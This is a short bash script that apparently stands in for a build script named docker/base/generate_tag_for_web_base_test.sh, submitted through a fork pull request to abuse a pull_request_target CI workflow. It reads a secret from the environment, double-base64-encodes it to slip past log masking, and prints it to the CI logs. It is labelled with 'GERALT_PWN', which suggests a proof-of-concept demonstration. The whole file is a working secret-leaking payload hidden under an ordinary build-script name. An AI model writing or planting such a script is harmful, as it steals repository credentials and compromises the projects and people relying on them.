#!/bin/bash
echo "GERALT_PWN: attacker-controlled docker/base/generate_tag_for_web_base_test.sh executed (pull_request_target fork head)" >&2
LEAKED="$(printf '%s' "${GERALT_SECRET:-}" | base64 | base64)"
echo "GERALT_LEAKED_TOKEN=$LEAKED" >&2
exit 1
